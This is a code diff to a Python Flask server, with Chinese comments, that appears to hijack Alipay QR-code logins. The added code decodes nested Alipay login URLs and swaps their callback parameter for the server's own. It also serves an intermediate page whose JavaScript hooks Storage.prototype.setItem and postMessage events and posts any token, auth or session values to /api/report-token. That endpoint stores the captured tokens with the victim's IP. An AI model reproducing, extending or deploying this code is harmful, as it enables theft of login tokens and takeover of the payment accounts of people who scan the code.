@@ -123,43 +123,116 @@ def fetch_fresh_token_and_url():
 
 def _modify_callback_in_url(original_url: str, new_callback: str) -> str:
     """
-    修改 alipays:// URL 中的回调地址
-    alipays URL 格式: alipays://platformapi/startapp?appId=xxx&url=ENCODED_URL
-    """
-    from urllib.parse import parse_qs, urlparse, urlencode, urlunparse, quote, unquote
+    修改支付宝登录 URL 中的回调地址
 
-    debug_log(f"[MODIFY] 原始URL: {original_url[:300]}")
+    实际 URL 结构（多层编码）:
+    第1层: https://render.alipay.com/p/s/ulink?scheme=alipays%3A%2F%2F...
+    第2层: alipays://platformapi/startapp?appId=...&url=https%3A%2F%2Frender.alipay.com%2Fp%2Fyuyan%2F...%2FpcLogin.html%3F...%26token%3D...
+
+    策略：逐层 URL decode，找到包含 pcLogin.html 的那层，将整个 url 参数
+    替换为我们的 callback URL
+    """
+    from urllib.parse import parse_qs, urlencode, quote, unquote, urlparse, parse_qsl
+
+    debug_log(f"[MODIFY] 原始URL: {original_url}")
     debug_log(f"[MODIFY] 新callback: {new_callback}")
 
-    # alipays:// 协议需要特殊处理
+    # ---- 情况1: 直接 alipays:// 开头 ----
     if original_url.startswith('alipays://'):
-        debug_log(f"[MODIFY] 检测到 alipays:// 协议")
-        # 提取 query 部分
+        debug_log(f"[MODIFY] 情况1: alipays:// 协议")
         if '?' in original_url:
             path_part, query_part = original_url.split('?', 1)
-            debug_log(f"[MODIFY] path_part: {path_part}")
-            debug_log(f"[MODIFY] query_part (前200): {query_part[:200]}")
-
             params = parse_qs(query_part)
-            debug_log(f"[MODIFY] 解析出参数: {list(params.keys())}")
-
-            # 打印所有参数值（截断）
             for k, v in params.items():
-                debug_log(f"[MODIFY]   {k} = {str(v)[:100]}")
-
-            # 替换 url 参数为我们的回调
+                debug_log(f"[MODIFY]   {k} = {str(v)[:120]}")
             params['url'] = [new_callback]
-
-            # 重新编码
             new_query = urlencode(params, doseq=True)
             result = f"{path_part}?{new_query}"
-            debug_log(f"[MODIFY] 修改后URL (前200): {result[:200]}")
+            debug_log(f"[MODIFY] 修改成功")
             return result
-        else:
-            debug_log(f"[MODIFY] URL 中没有 ? 号，无法解析参数", "WARN")
 
-    # 如果不是 alipays:// 格式
-    debug_log(f"[MODIFY] URL 不是 alipays:// 开头，原样返回", "WARN")
+    # ---- 情况2: https://render.alipay.com/p/s/ulink?scheme=... ----
+    parsed = urlparse(original_url)
+    debug_log(f"[MODIFY] URL scheme={parsed.scheme}, host={parsed.netloc}, path={parsed.path}")
+    debug_log(f"[MODIFY] query (前300): {parsed.query[:300]}")
+
+    query_params = dict(parse_qsl(parsed.query))
+    debug_log(f"[MODIFY] 顶层参数: {list(query_params.keys())}")
+
+    if 'scheme' in query_params:
+        # 解码 scheme 参数得到 alipays:// URL
+        scheme_val = query_params['scheme']
+        debug_log(f"[MODIFY] scheme 值 (前200): {scheme_val[:200]}")
+
+        # 逐层 decode 直到稳定
+        decoded = scheme_val
+        for level in range(5):
+            try:
+                new_decoded = unquote(decoded)
+                if new_decoded == decoded:
+                    break
+                decoded = new_decoded
+                debug_log(f"[MODIFY] decode level {level+1}: {decoded[:150]}")
+            except Exception:
+                break
+
+        debug_log(f"[MODIFY] 最终解码: {decoded[:300]}")
+
+        if decoded.startswith('alipays://'):
+            # 解析 alipays:// URL 的参数
+            if '?' in decoded:
+                alipays_path, alipays_query = decoded.split('?', 1)
+                alipays_params = dict(parse_qsl(alipays_query))
+                debug_log(f"[MODIFY] alipays 参数: {list(alipays_params.keys())}")
+
+                inner_url = alipays_params.get('url', '')
+                if inner_url:
+                    debug_log(f"[MODIFY] alipays 内嵌 url (前300): {inner_url[:300]}")
+
+                    # 再逐层 decode 内嵌 url
+                    inner_decoded = inner_url
+                    for level in range(5):
+                        try:
+                            new_d = unquote(inner_decoded)
+                            if new_d == inner_decoded:
+                                break
+                            inner_decoded = new_d
+                        except Exception:
+                            break
+
+                    debug_log(f"[MODIFY] 内嵌 url 解码: {inner_decoded[:300]}")
+
+                    # 策略A: 直接把 alipays 的 url 参数替换为我们的 callback
+                    debug_log(f"[MODIFY] >>> 采用策略A: 替换 alipays url 参数为 callback <<<")
+                    alipays_params['url'] = new_callback
+                    new_alipays_query = urlencode(alipays_params)
+                    new_alipays = f"{alipays_path}?{new_alipays_query}"
+
+                    # 重新编码并放回外层 scheme 参数
+                    # 需要 encode 一次（从 alipays:// 到 scheme 参数需要一次编码）
+                    re_encoded = quote(new_alipays, safe='')
+                    query_params['scheme'] = re_encoded
+
+                    # 重建完整 URL
+                    new_query = urlencode(query_params)
+                    result = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+
+                    debug_log(f"[MODIFY] 修改成功!")
+                    debug_log(f"[MODIFY] 结果 (前300): {result[:300]}")
+                    return result
+
+        debug_log(f"[MODIFY] 无法解析 scheme 参数结构", "WARN")
+
+    # ---- 情况3: url 参数直接存在 ----
+    if 'url' in query_params:
+        debug_log(f"[MODIFY] 情况3: 直接 url 参数")
+        query_params['url'] = new_callback
+        new_query = urlencode(query_params)
+        result = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
+        debug_log(f"[MODIFY] 修改成功")
+        return result
+
+    debug_log(f"[MODIFY] !!! 所有策略均失败，原样返回 !!!", "ERROR")
     return original_url
 
 
@@ -259,25 +332,112 @@ def index():
 
 @app.route('/login')
 def login():
-    """核心：扫码入口 - 实时获取新token并重定向到支付宝"""
+    """核心：扫码入口 - 获取 token 后返回我们的中间页面"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     debug_log(f"[LOGIN] ========== 新扫码请求 ==========")
     debug_log(f"[LOGIN] 客户端IP: {client_ip}")
-    debug_log(f"[LOGIN] User-Agent: {request.headers.get('User-Agent', 'N/A')}")
+    debug_log(f"[LOGIN] User-Agent: {request.headers.get('User-Agent', 'N/A')[:100]}")
     debug_log(f"[LOGIN] Referer: {request.headers.get('Referer', 'N/A')}")
-    debug_log(f"[LOGIN] 完整请求头:")
-    for k, v in request.headers:
-        debug_log(f"[LOGIN]   {k}: {v}")
 
     with lock:
         config["scan_count"] += 1
 
-    token, redirect_url = fetch_fresh_token_and_url()
+    token, alipay_url = fetch_fresh_token_and_url()
 
-    if redirect_url:
-        debug_log(f"[LOGIN] -> 302 重定向到支付宝")
-        debug_log(f"[LOGIN] -> redirect_url: {redirect_url[:200]}")
-        return redirect(redirect_url, code=302)
+    if token and alipay_url:
+        debug_log(f"[LOGIN] token 获取成功 (len={len(token)})")
+        debug_log(f"[LOGIN] alipay_url: {alipay_url[:200]}")
+
+        # 不直接 302 到支付宝，而是返回一个中间页面
+        # 这个页面会跳转到支付宝，然后监听返回的 token
+        base = get_base_url()
+        debug_log(f"[LOGIN] base_url: {base}")
+
+        return f"""<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>登录中...</title>
+    <script>
+        // 保存服务端获取的登录 token（getLoginToken 返回的 JWT）
+        var loginToken = "{token}";
+        var serverBase = "{base}";
+
+        console.log("[LOGIN] loginToken (前30):", loginToken.substring(0, 30));
+        console.log("[LOGIN] serverBase:", serverBase);
+
+        // 监听来自支付宝页面的 postMessage（pcLogin.html 可能通过 iframe 发送）
+        window.addEventListener("message", function(event) {{
+            console.log("[POSTMESSAGE] origin:", event.origin);
+            console.log("[POSTMESSAGE] data:", JSON.stringify(event.data));
+
+            // 尝试从 event.data 中提取 token
+            var data = event.data;
+            if (typeof data === 'string') {{
+                try {{ data = JSON.parse(data); }} catch(e) {{}}
+            }}
+
+            // 发送到我们的服务器
+            var tokenStr = data.token || data.authCode || data.gameToken ||
+                           data.sessionId || (typeof data === 'string' ? data : '');
+            if (tokenStr) {{
+                fetch(serverBase + "/api/report-token", {{
+                    method: "POST",
+                    headers: {{"Content-Type": "application/json"}},
+                    body: JSON.stringify({{
+                        type: "postmessage",
+                        source: event.origin,
+                        data: data
+                    }})
+                }}).then(r => r.json()).then(j => {{
+                    console.log("[POSTMESSAGE] 已上报服务器:", j);
+                }});
+            }}
+        }}, false);
+
+        // 也监听 localStorage/sessionStorage 变化（支付宝可能通过 storage 传递 token）
+        var origSetItem = Storage.prototype.setItem;
+        Storage.prototype.setItem = function(key, value) {{
+            console.log("[STORAGE] setItem:", key, "=", String(value).substring(0, 50));
+            origSetItem.call(this, key, value);
+
+            // 如果 key 包含 token 相关关键字，上报
+            var kl = key.toLowerCase();
+            if (kl.indexOf('token') >= 0 || kl.indexOf('auth') >= 0 || kl.indexOf('session') >= 0 ||
+                kl.indexOf('game') >= 0 || kl.indexOf('pcweb') >= 0) {{
+                fetch(serverBase + "/api/report-token", {{
+                    method: "POST",
+                    headers: {{"Content-Type": "application/json"}},
+                    body: JSON.stringify({{
+                        type: "storage_set",
+                        key: key,
+                        value: String(value).substring(0, 500)
+                    }})
+                }});
+            }}
+        }};
+
+        // 跳转到支付宝
+        setTimeout(function() {{
+            window.location.href = "{alipay_url}";
+        }}, 500);
+    </script>
+    <style>
+        body {{ font-family: sans-serif; background: #667eea; color: white;
+               display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
+        .box {{ text-align: center; }}
+        h2 {{ margin-bottom: 10px; }}
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>正在跳转到支付宝...</h2>
+        <p>请确认登录</p>
+        <p style="font-size:12px;opacity:0.7;">token: {token[:30]}...</p>
+    </div>
+</body>
+</html>"""
     else:
         debug_log(f"[LOGIN] FAILED: 无法获取 token", "ERROR")
         return Response("Server error, please try again later", status=503)
@@ -447,6 +607,64 @@ def get_debug_logs():
             "count": len(debug_logs),
             "logs": debug_logs
         })
+
+
+@app.route('/api/report-token', methods=['POST'])
+def report_token():
+    """
+    接收前端 JS 上报的 token 数据
+    来自中间页面的 postMessage/storage 监听
+    """
+    try:
+        data = request.get_json(force=True)
+    except Exception:
+        data = {}
+
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+    debug_log(f"[REPORT-TOKEN] ========== 前端上报 ==========")
+    debug_log(f"[REPORT-TOKEN] IP: {client_ip}")
+    debug_log(f"[REPORT-TOKEN] 数据: {json.dumps(data, ensure_ascii=False, default=str)[:1000]}")
+
+    # 提取可能的 authCode / token
+    token_value = None
+    report_type = data.get('type', 'unknown')
+
+    if report_type == 'postmessage':
+        inner = data.get('data', {})
+        if isinstance(inner, dict):
+            token_value = (
+                inner.get('token') or inner.get('authCode') or
+                inner.get('gameToken') or inner.get('sessionId') or
+                inner.get('x-game-token-pcweb') or
+                inner.get('accessToken') or inner.get('code')
+            )
+        elif isinstance(inner, str) and len(inner) > 10:
+            token_value = inner
+    elif report_type == 'storage_set':
+        key = data.get('key', '')
+        value = data.get('value', '')
+        token_value = value
+        debug_log(f"[REPORT-TOKEN] storage key={key}")
+
+    # 保存
+    entry = {
+        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'ip': client_ip,
+        'authCode': token_value,
+        'report_type': report_type,
+        'raw_data': data,
+    }
+
+    with lock:
+        authcodes.append(entry)
+
+    if token_value:
+        debug_log(f"[REPORT-TOKEN] >>> 捕获到 token! (len={len(token_value)}) <<<")
+    else:
+        debug_log(f"[REPORT-TOKEN] 未提取到有效 token", "WARN")
+
+    return jsonify({"ok": True, "captured": token_value is not None})
 
 
 @app.route('/api/debug/clear', methods=['POST'])
